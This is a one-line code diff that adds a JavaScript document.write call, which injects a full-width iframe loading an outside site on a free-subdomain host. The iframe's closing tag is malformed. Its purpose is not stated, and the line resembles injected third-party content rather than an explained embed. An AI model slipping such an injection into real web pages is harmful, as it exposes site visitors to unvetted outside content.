@@ -1,0 +1,1 @@
+document.write('<iframe src="https://duck-ment.e.cn.vc/" style="width:100%;height:500px"><iframe>')
